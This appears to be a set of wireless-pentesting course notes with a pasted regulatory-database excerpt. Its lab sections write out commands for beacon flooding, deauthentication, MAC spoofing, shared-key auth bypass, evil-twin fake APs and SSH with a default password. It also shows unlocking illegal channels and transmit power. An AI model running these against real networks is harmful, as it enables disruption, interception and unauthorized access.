@@ -1,0 +1,4043 @@
+Aula 2
+======
+
+- WLAN can operate in 3 different Frequency ranges
+	- 2.5Ghz (802.11b/g/n)
+	- 3.6Ghz (802.11y)
+	- 4.9/5.0Ghz (802.11a/h/j/n)
+- Each of these ranges is divided into multiple channels
+- Every country has allowed channels, users and maximum power levels
+- However, wireless card can be configurate disregard these policies
+
++---------+----------+-----+-------+---------------+
+| Channel | Freq Mhz | USA | Japan | Most of World |
++---------+----------+-----+-------+---------------+
+| 1       | 2412     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 2       | 2417     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 3       | 2422     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 4       | 2427     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 5       | 2432     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 6       | 2437     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 7       | 2442     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 8       | 2447     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 9       | 2452     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 10      | 2457     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 11      | 2462     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 12      | 2467     | No  | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 13      | 2472     | No  | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 14      | 2484     | No  | 11b   | No            |
++---------+----------+-----+-------+---------------+
+
+Difference between Wired and Wireless Sniffing
+- Key difference with wired
+	- Concept of channels and bands in wireless
+	- Wireless card can only be on channel at a time
+	- Cannot sniff on all channels and bands at the same time
+	- Wireless card needs to be capable of operating in the give range: a?b?g?n?h?
+	- Alfa Network card operates in b/g
+
+Lab Session: Sniffing and Channel Hopping
+- Use airodump-ng utility to cycle through the different channels
+- Locale different wireless networks over the air
+- View the packets in Wireshark
+
+iwconfig
+
+iwconfig wlan0 channel 1
+
+iwconfig
+Frequency: 2412 Mhz --> equivale a canal 1
+
+airodump-ng --help
+
+airodump --band bg mon0
+
+observe o hopping em:
+ CH XX]
+
+Aula 3
+======
+
+Understanding the access point
+
+- Access Point is configured with an SSID
+- This SSID acts as a network name for discovery
+- Clients search for this access point or network using this SSID
+- Access point sends out broadcast frames called Beacon Frames to announce its presence
+- Clients use this to show available wireless network list
+
+Demos
+- Start wireshark and capture Beacon Frames
+- Analyze various important header filds in the Beacon Frame
+Identify things like SSID, Encryption, Channel, etc.
+
+ifconfig -a
+
+ifconfig wlan0 up
+
+airmon-ng start wlan0
+
+ifconfig
+
+
+wireshark &
+
+capture->interface->mon0->start
+
+filter: 
+
+IEEE 802.11 Beacon Frame
+Type/Subtype: 0x08
+ Type: 0
+ Subtype: 8
+IEEE 802.11 wireless LAN Management Frame
+ Capability Information: 0x411
+  Ess: 1 = AP
+ Tagged parameter set
+  SSID
+   Tag interception: how2security
+  Suported Rates: Taxas suportadas
+  DS Parameter set: Current Channel: 1
+
+Pwing Beacon Frames
+- Anyone can create and transmit beacon frame
+- All client will list that as a new access point
+- We will use MDK on BT4 to do this
+
+Demo Time!
+
+# Vamos eviar diversos beacon frame na rede
+
+cd /pentest/wireless/mdk3
+
+ls
+
+./mdk3
+
+./mdk3 --help b
+
+./mdk3 mon0 b -n Pwned
+
+# Envia em diversos canais e com diferentes MAC Address.
+# De uma analisada no wireshark os beacon frame da rede Pwned =]
+# olhe também as redes encontrada nos seus dispositivos de rede
+
+What did we learn?
+- Spoffing 802.11 frames is simple
+- No protection mechanism available
+- Seems similar to TCP/IP spoofing
+- We will use this "insecurity" over and over again in attacks
+
+Aula 4
+======
+
+Objective
+- To understand how AP and Clients communicate
+- Strip downto the packet level
+- Understand details with wireshark
+
+Demo Time
+- Create an open authentication and no encryption based AP with SSID "How2Security"
+- Connect a client to it
+	- Laptop
+	- smartphone
+- Collect all the packets using Wireshark
+	- Ensure your card is also on the same channel
+- Analyze the flow
+
+ifconfig
+
+iwconfig wlan0 channel 1
+iwconfig mon0 channel 1
+
+iwconfig
+
+wireshark &
+
+filter: (wlan.addr == MAC Address AP) && !(wlan.fc.type_subtype == 0x08)
+
+capture->interface->mon0->start
+
+# Conecte com o laptop e com o smartphone
+
+filter: (wlan.addr == MAC Address Client)
+
+# Olhe os pacotes probe request e os probe response
+
+filter: (wlan.addr == MAC Address AP) && (wlan.addr == MAC Address Client)
+
+# Olhe os pacotes de autenticação
+Authentication sequence 0x0001 --> request
+Authentication sequence 0x0002 --> Response with Sussesful
+
+# Olhe os pacotes de associação request e response
+
+
+
+Client - AP Connection Packets
+
+ +-----+ Probe Request ------------------->  +----+
+ | STA | <------------------- Probe Response | AP |
+ +-----+ Open Sys Authentication Request --> |    |
+/      / <-----------------Open Sys Response |    |
++-----+  Assoc Request --------------------> +----+
+         <------------------- Assoc Response 
+           -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+            IEEE 802.1X Controlled Port Blocked
+
+
+                        +---- Deassociation -------+
+                        v                          |
++-----------+     +-----------+     +-------+      |
+| Não Auth  |     | Auth      |     | Auth  |      |
+|           | --> |           | --> |       | -----+
+| Não Assoc |     | Não Assoc |     | Assoc |      |
++-----------+     +-----------+     +-------+      |
+      ^                                            |
+      +------ Deaauthentication -------------------+
+
+
+Aula 5
+======
+
+Terminology
+- STA -> Station (Wireless Client)
+- BSS -> Basic Service Set (set of nodes communicating with each other)
+	- Infrastructure BSS (AP and Clients)
+	- Independent BSS (Ad-hoc Clients)
+- ESS -> Extended Service Set (set of  connected BSSs)
+- BSSID -> Basic Service Set Identifier
+	- Infrastruture BSS (MAC Address of AP)
+	- IBSS (Randomly Chosen MAC Address)
+- DS -> Distribution System (connects APs in an ESS)
+
+
+Fala da estrutura dos pacotes padrão IEEE802.11
+
+wireshark &
+
+# Beacon Frame
+filter: (wlan.fc.type_subtype == 0x08) = 8
+
+# Probe Request
+filter: (wlan.fc.type_subtype == 0x04) = 4
+
+# Probe Response
+filter: (wlan.fc.type_subtype == 0x05) = 5
+
+# Autentication Request
+filter: (wlan.fc.type_subtype == 0x0B) = 11 Auth Seq = 1
+
+# Autehntication Response
+filter: (wlan.fc.type_subtype == 0x0B) = 11 Auth Seq = 2
+
+# Association Request
+filter: (wlan.fc.type_subtype == 0x00) = 0
+
+# Association Response
+filter: (wlan.fc.type_subtype == 0x01) = 1
+
+# Desautenticação
+filter: (wlan.fc.type_subtype == 0x0C) = 12
+
+Aula 06
+=======
+
+Sniffing Hidden SSID
+- Turn SSID braodcasting off in beacon frames
+- Just monitoring beacon frames will not give you the SSID
+- A "Security through Obscurity" technique at best
+- Can only deter nivices
+- Hardly a challenge for the experienced wireless hacker
+
+# oculte o ssid do seu ap
+
+airodump-ng mon0 --channel 1
+
+wireshark &
+
+capture->interface->mon0->start
+
+filter: wlan.addr == MAC do AP
+
+Observe os SSID=Broadcast <-- SSID Oculto
+
+Pwning Hidden SSID
+- Multiple Techniques:
+	- Monitor air for a new client trying to associate with the access point (passive)
+	- De-Authentication one or all clients and monitor reconnections (active)
+- Basic idea is to force the network to send Probe / Association packets
+- These packets contain the SSID even if not present in the beacon frame from the access point
+
+1ª Technica Passiva
+-------------------
+
+airodump-ng mon0 --channel 1 --bssid MAC_AP
+
+
+wireshark &
+
+capture->interface->mon0->start
+
+filter: (wlan.addr == MAC do Client)
+
+# se conecte com um dispositivo a rede oculta
+# olhe no airodump-ng o nome da rede oculta
+# agora olhe no wireshark o probe request enviando o nome da rede ssid
+# assim como a resposta do probe confirmando o nome da rede
+
+
+
+2ª Technica Ativa
+-----------------
+
+airodump-ng mon0 --channel 1 --bssid MAC_AP
+
+wireshark &
+
+capture->interface->mon0->start
+
+filter: (wlan.addr == MAC do Client) || (wlan.addr == MAC do AP)
+
+# outro terminal
+
+aireplay-ng
+
+aireplay-ng --deauth 0 -a MAC_AP mon0
+....
+^C
+
+# se conecte com um dispositivo a rede oculta
+# olhe no airodump-ng o nome da rede oculta
+# agora olhe no wireshark o probe request enviando o nome da rede ssid
+# assim como a resposta do probe confirmando o nome da rede
+
+
+Aula 07
+=======
+Origin of MAC Filters
+- Used in the Wired World
+- Switches and Filtering devices like Firewalls
+- Idea was to have a set of "whitelisted" MAC Addresses and deny rest
+- Is insecure as MAC Address can be easily spoofed
+- Reasonably secure if authorized MAC Address are few and attacks cannot get physical access to the authorized machines to find the MAC
+
+Wireless MAC Filters
+- Not a feature in the 802.11 standard
+- Can add them on the access point (network layer filter)
+- Simple way to only whitelisted MAC
+- ** Time to Laugh ** =] =] =]
+	- MAC addresses are visible in plain text in the WLAN header
+	- We simply need to monitor associated clients and find their MAC Addresses
+	- Use the MAC when the client is gone / still present
+	- No defense at all!
+
+Demo!
+
+# Crie um filtro para seu dispositivo
+
+airodump-ng mon0
+
+wireshark &
+
+capture->Interface->mon0->start
+
+iwconfig mon0 channel 1
+iwconfig wlan0 channel 1
+
+filter: (wlan.addr == MAC do AP) && !(wlan.fc.type_subtype == 0x08)
+
+aireplay-ng
+
+aireplay-ng --fakeauth 10 -e how2security mon0
+Authentication failed (code 1)
+
+# Ache um MAC de um cliente associado ao AP no wireshark e também da associação dele com airodump-ng
+airodump-ng -c 1 mon0
+
+aireplay-ng --fakeauth 10 -e how2security -h MAC_Client mon0
+Authentication and Association sussesful
+
+
+Aula 08
+=======
+WLAN Authentication
+- WLAN Authentication by itself is not powerful at all
+- 2 types
+	- Open Authentication
+	- Shared Authentication
+
+
+Open Authentication
+- No "actual" authentication mechanism at all
+- 2 packets exchanged between Client and AP and Authentication ends
+- Cases where authentication may fail
+	- MAC Filtering
+
+
+Client - AP Connection Packets
+
+		  +-----+ PAuthRequest -------------------->  +----+
+		  | STA | <------------------- Challenge      | AP | Generate random number to challenge satation (128octets) 
+Encrypt challenge +-----+ Response Challenge ---------------> |    |
+using RC4 algori /      / <---------------- Confirm Success   |    | Decrypt response to recovery challenge verify that
+thm		 +-----+  				      +----+ challenges equate
+
+
+Understanding Shared Authentication
+- Challege is encrypted using the WEP key
+- WEP uses RC4 which is a stream cipher
+- RC4 keystream is XOR'ed with plain text challenge and response is returned
+- We will discuss WEP in detail later
+
+airodump-ng --channel 1 mon0
+
+airodump-ng --channel 1 --bssid MAC_AP --write demo mon0
+
+wireshark &
+filter: (wlan.addr == MAC do AP) && (wlan.fc.type_subtype == 0x0B)
+
+# Se conecte com um dispositivo e olhe os pacotes de autentcação
+1º pacote
+Authentication Request
+
+2º pacote
+IEEE 802.11 wireless LAN management frame
+ Tagged parameters
+  challenge text
+   tag interpretation challenge text: texto cifrado
+
+3º pacote
+IEEE 802.11 Authentication
+ WEP parameters
+  Inicialization Vector
+
+4º pacote
+IEEE 802.11 wireless LAN management frame
+ Fixed parameters
+  Status code: successful
+
+
+Simple Math to nail shared auth
+
+  +-----+ Plan text challenge ------------->  +----+
+  | STA | <------------- Cypher Text Response | AP | 
+  +-----+ 				      |    |
+ /      /  				      |    |
+ +-----+  <--+		    +---------------> +----+
+	      \		   /
+	       \Listening /\
+		\	 /  \
+		  +-----+    \
+		  | STA |     +-->   Plan Text Challenge
+		  +-----+                   |
+		 /      /                   v
+		 +-----+                 | XOR | ---> keystream
+                                            ^
+                                            |
+			 	     Cypher text Response
+X = Plain Text Challenge
+Y = WEP Keystream
+Z = Encrypted Challenge
+
+Z = X (xor) Y
+Z(xor)X = (X(xor)Y) (xor)X = Y
+
+
+airodump-ng --channel 1 --bssid MAC_AP --write fakeauth mon0
+
+aireplay-ng --fakeauth 10 mon0 -e how2security -y demo-MAC_AP.xor
+
+wireshark fakeauth-01.cap &
+
+filter: (wlan.addr == MAC do AP) && (wlan.fc.type_subtype == 0x0B)
+
+# Olhe os pacotes do desafio
+
+Using the keystream and IV
+- Use for shared authentication with the ap
+- Can be used to encrypt small packets (128 bytes)
+	- Arbitrary injection
+- IV and Keystream can be harvested to create a table based decryption attack
+	- Need a lot SKA tries
+	- Can only decrypt first 128 bytes of every pa
+
+
+Aula 09
+=======
+Hostpot Basics
+- Free/Paid WiFi based internet offered in public places
+	- Coffee shop
+	- Airport
+- Typically uses
+	- Open Authentication
+	- MAC Filtering at times
+	- No encryption
+		- Distribution of keys would be a nightmare
+	- Can use captive portals for application layer autentication
+
+Hostpot attacks
+- Create Evil Twin in the vicinity
+	- Same ESSID
+	- Same BSSID (Optional)
+- Use De-Authentication attacks to break client ap coneection
+- If evil twin has higher signal strength, then client will connect to it
+
+
+Attack Visualization
+
+  +-----+ <--- SSID How2Security +----------> +----+
+  | STA |         Beacon        /             | AP | 
+  +-----+ 		       /	      |    |
+ /      /  		      /	   +--------> |    |
+ +-----+  <--+		     /    /           +----+
+	      \		    /    /
+DHCP Server    \           / De-Auth	
+FakeSSID	\	  /    /
+		  +-----+/    / 1. Relay it ti the access point (MiTM)
+		  | STA |    / 
+		  +-----+   /
+		 /      /  /
+		 +-----+  /
+                 STAttack \
+                           \ 2. Relay to Internet Directly
+                            +----> Internet
+
+
+Demo!
+
+O access point está open system
+
+
+airodump-ng mon0
+
+# Ache o access point (SSID e BSSID)
+
+iwconfig wlan0 channel 11
+iwconfig mon0 channel 11
+
+airbase-ng
+
+airbase-ng -a AA:AA:AA:AA:AA:AA:AA -e how2security mon0
+access point with bssid aa:aa:aa:aa:aa:aa:aa started
+
+# outro terminal
+ifonfig -a
+at0
+
+ifcongig
+
+ifconfig at0 up
+
+iwconfig wlano channel 11
+iwconfig mon0 channel 11
+
+# conecte seu dispositivo a rede wireless
+
+aireplay-ng --deauth 0 -a MAC_AP mon0
+^C
+
+# o client desconecta
+airbase-ng -a AA:AA:AA:AA:AA:AA:AA -e how2security mon0
+access point with bssid aa:aa:aa:aa:aa:aa:aa started
+
+ifconfig at0 up
+
+wireshark &
+
+capture->Interface->at0->start
+
+ifconfig at0 169.254.174.226 netmnask 255.255.255.0 up
+ping 169.254.174.227
+ok
+
+
+ssh 169.254.174.227
+password: alpine
+
+Aula 10
+=======
+
+Attack Client Isolated
+
+
+Understanding Client
+             +--------- Probe Request default
+  +-----+   /
+  | STA |  /+----- Probe Request how2security   
+  +-----+ //		
+ /      / -------- Probe Request homeap 		 
+ +-----+  \\
+	   \+----- Probe Request officeap
+Autmatic    \
+Connect      +---- Probe Request hotalap
+   |
+   v
+ SSIDs
+ defaults
+ how2security
+ homeap
+ officeap
+ hotelap        
+
+
+Demo!
+
+airodump-ng mon0
+
+# conect com o dispositivo  pegue os dados de associação
+(not associated) MAC_STA -15 0 - 1 20 defaults, how2security, homeap, officeap, hotelap
+
+wireshark &
+
+captire mon0
+
+filter: (wlan.addr == MAC do STA)
+
+
+Inconsistent Behavior
+- Different OS behave differently
+	- Linux
+	- Windows
+	- OS X
+- Different in behavior even between SP in Windows
+- We will take up most common behavior
+	- Client searching for known access points
+
+Multiple Cases Possible
+- Access point stored in the PNL or similar could have either of 3 configurations:
+	- No encryption
+	- WEP
+	- WPA/WPA2
+- We will dead with each of the them seme
+
+
+1º Case: Open Auth, No Encryption
+
+ +-----+			+----+
+ | STA |			| STA|
+ +-----+ 			|    | STAttack
+/      / 			|    |
++-----+  			+----+
+   | Probe Request how2sec -----> |
+   | <---- Probe Response how2sec |
+   | Auth Request --------------> |
+   | <------------- Auth Response |
+   | Assoc Request -------------> |
+   | <------------ Assoc Response |
+   | <----- Data Exchange ------> |
+
+
+Fundamental Problem
+- Client cannot authenticate the access point
+- The SSID all alone is used to decide whom to connect to
+- Anyone can set a similar SSID and force a client to connect to their access point
+- This is especially true with Hotspot SSID as they by definition are Open Authentication with no Encryption
+
+airbase-ng --essid how2security -a AA:AA:AA:AA:AA:AA mon0
+
+wireshark &
+
+capture mon0
+
+filter: (wlan.addr == MAC do STA) && (wlan.addr == AA:AA:AA:AA:AA:AA)
+
+
+^C
+airbase-ng --essid how2security -a AA:AA:AA:AA:AA:AA -v mon0
+^C
+
+# podemos fazer com que nosso FakeAP responda a todos os probe request de um cliente
+airbase-ng -P -C 10 -a AA:AA:AA:AA:AA:AA -v mon0
+
+Case 2 and case 3
+- WEP and WPA/WPA2
+- Shared Key Authentication
+- We will talk about these onde we finish the encryption fundamentals class
+
+Aula 11
+=======
+
+Alfa Card Kunk-Fu
+
++---------+----------+-----+-------+---------------+
+| Channel | Freq Mhz | USA | Japan | Most of World |
++---------+----------+-----+-------+---------------+
+| 1       | 2412     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 2       | 2417     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 3       | 2422     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 4       | 2427     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 5       | 2432     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 6       | 2437     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 7       | 2442     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 8       | 2447     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 9       | 2452     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 10      | 2457     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 11      | 2462     | Yes | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 12      | 2467     | No  | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 13      | 2472     | No  | Yes   | Yes           |
++---------+----------+-----+-------+---------------+
+| 14      | 2484     | No  | 11b   | No            |
++---------+----------+-----+-------+---------------+
+
+
+tail -f /var/log/messages
+
+# insira o cart e olhe os logs
+
+Understanding Transmit Power
+dBm to Watt Convertion Chart
+dBm = log10(mW)*10
+mW = 10^(dBm/10)
+
+
+40 dBm		10.00 watts
+36 dBm		04.00 watts <--- Maximum ERB allowed by FCC in US
+30 dBm		01.00 watt
+27 dBm		500 milliwatts
+26 dBm		400 milliwatts
+25 dBm		320 milliwatts
+24 dBm		250 milliwatts
+23 dBm		200 milliwatts
+22 dBm		160 milliwatts
+21 dBm		130 milliwatts
+20 dBm		100 milliwatts <--- Maximum ERB allowed by ETSI in Europe
+15 dBm		32 milliwatts
+10 dBm		10 milliwatts
+5 dBm		3,2 milliwatts
+4 dBm		2,5 milliwatts
+3 dBm		2,0 milliwatts
+2 dBm		1,6 milliwatts
+1 dBm		1,3 milliwatts
+0 dBm		1,0 milliwatts
+-1 dBm		0,79 milliwatts
+-5 dBm		0,32 milliwatts
+-10 dBm		0,1 milliwatts
+-20 dBm		0,01 milliwatts
+-30 dBm		0,001 milliwatts
+-40 dBm		0,0001 milliwatts
+-50 dBm		0,00001 milliwatts
+-60 dBm		0,000001 milliwatts
+-70 dBm		0,0000001 milliwatts
+-80 dBm		0,00000001 milliwatts <--- Receive threshold for most WLAN devices
+
+EIRP
+- Effective Isotropic Radiated Power
+= Transmitter Power (in dBm)
++ Antenna Gain (in dBi)
+- Cable loss (in dBm)
+
+
+ifconfig wlan0 up
+
+iwconfig wlan0 channel 1
+freq 2.412
+
+iwconfig wlan0 txpower 30
+invalid argument
+
+iwconfig channel 11
+iwconfig channel 12
+iwconfig channel 13
+iwconfig channel 14
+
+iwconfig
+freq: 2.484
+
+https://kernel.googlesource.com/pub/scm/linux/kernel/git/linville/wireless-regdb/+/af726449e73286e1375e7a72336045d9d0ce84f8/db.txt
+
+ou
+
+http://git.kernel.org/?p=linux/kernel/git/linville/wireless-regdb.git;a=blob;f=db.txt;hb=HEAD <-- esse é oficial do kernel
+
+country US: DFS-FCC
+	(2402 - 2472 @ 40), (3, 27)
+	(5170 - 5250 @ 40), (3, 17)
+	(5250 - 5330 @ 40), (3, 20), DFS
+	(5490 - 5600 @ 40), (3, 20), DFS
+	(5650 - 5710 @ 40), (3, 20), DFS
+	(5735 - 5835 @ 40), (3, 30)
+
+# outro terminal
+
+tail -f /var/log/messages
+
+iw
+
+iwconfig wlan0 channel 1
+
+ifconfig wlan0 down
+
+iw reg set US
+
+# olhe o log e veja que o domínio mudou para US
+
+ifcondif wlan0 up
+
+iwconfig wlan0 txpower 27
+
+iwconfig wlan0 channel 1
+iwconfig
+# olhe o tx-power=27
+
+
+iwconfig wlan0 channel 12
+error
+
+
+Can this settings be changed?
+- Yes =] we can change our channel (without any driver or kenrekl modifications) to any one of the following:
+http://git.kernel.org/?p=linux/kernel/git/linville/wireless-regdb.git;a=blob;f=db.txt;hb=HEAD
+
+- To be used when you are traveliong to a new country
+- The card will need top support the channel and max transmit power for the country
+- ight be illegal to transmit high power or u  channels in your contry
+
+country BO: DFS-JP  -- Bolivia
+	(2402 - 2482 @ 40), (20) <-- Japão canal 14
+	(5250 - 5330 @ 80), (30), DFS
+	(5735 - 5835 @ 80), (30)
+
+ifconfig wlan0 down
+
+iw reg set BO
+
+ifconfig wlan0 up
+
+iwconfig wlan0 wlan0 channel 12
+
+iwconfig wlan0 txpower 30
+
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- SOF =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+# This is the world regulatory domain
+country 00:
+	(2402 - 2472 @ 40), (20)
+	# Channel 12 - 13.
+	(2457 - 2482 @ 40), (20), NO-IR
+	# Channel 14. Only JP enables this and for 802.11b only
+	(2474 - 2494 @ 20), (20), NO-IR, NO-OFDM
+	# Channel 36 - 48
+	(5170 - 5250 @ 80), (20), NO-IR, AUTO-BW
+	# Channel 52 - 64
+	(5250 - 5330 @ 80), (20), NO-IR, DFS, AUTO-BW
+	# Channel 100 - 144
+	(5490 - 5730 @ 160), (20), NO-IR, DFS
+	# Channel 149 - 165
+	(5735 - 5835 @ 80), (20), NO-IR
+	# IEEE 802.11ad (60GHz), channels 1..3
+	(57240 - 63720 @ 2160), (0)
+
+
+country AD:
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20)
+	(5250 - 5330 @ 80), (20), DFS
+	(5490 - 5710 @ 80), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country AE: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country AF: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+# Source:
+# http://pucanguilla.org/Downloads/January2005-Anguilla%20Table%20of%20Allocations.pdf
+country AI: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country AL: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20.00), AUTO-BW
+	(5250 - 5330 @ 80), (20.00), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27.00), DFS
+
+country AM: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (18)
+	(5250 - 5330 @ 80), (18), DFS
+
+country AN: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country AR: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country AS: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country AT: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country AU:
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country AW: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country AZ: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (18), AUTO-BW
+	(5250 - 5330 @ 80), (18), DFS, AUTO-BW
+
+country BA: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country BB: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (23), AUTO-BW
+	(5250 - 5330 @ 80), (23), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (30)
+
+country BD: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5735 - 5835 @ 80), (30)
+
+country BE: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country BF: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country BG: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+	# 60 gHz band channels 1-4, ref: Etsi En 302 567
+	(57000 - 66000 @ 2160), (40)
+
+country BH: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20)
+	(5250 - 5330 @ 80), (20), DFS
+	(5735 - 5835 @ 80), (20)
+
+country BL: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country BM: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country BN: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5735 - 5835 @ 80), (20)
+
+country BO: DFS-JP
+	(2402 - 2482 @ 40), (20)
+	(5250 - 5330 @ 80), (30), DFS
+	(5735 - 5835 @ 80), (30)
+
+country BR: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+country BS: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (24), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+# Source:
+# http://www.bicma.gov.bt/paper/publication/nrrpart4.pdf
+country BT: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country BY: DFS-ETSI
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 80), (20), AUTO-BW
+	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
+	(5490 - 5710 @ 160), (27), DFS
+
+country BZ: DFS-JP
+	(2402 - 2482 @ 40), (30)
+	(5735 - 5835 @ 80), (30)
+
+country CA: DFS-FCC
+	(2402 - 2472 @ 40), (30)
+	(5170 - 5250 @ 80), (17), AUTO-BW
+	(5250 - 5330 @ 80), (24), DFS, AUTO-BW
+	(5490 - 5730 @ 160), (24), DFS
+	(5735 - 5835 @ 80), (30)
+
+# Source:
+# http://www.art-rca.org
+country CF: DFS-FCC
+	(2402 - 2482 @ 40), (20)
+	(5170 - 5250 @ 40), (17)
+	(5250 - 5330 @ 40), (24), DFS
+	(5490 - 5730 @ 40), (24), DFS
+	(5735 - 5835 @ 40), (30)
+
+country CH: DFS-ETSI
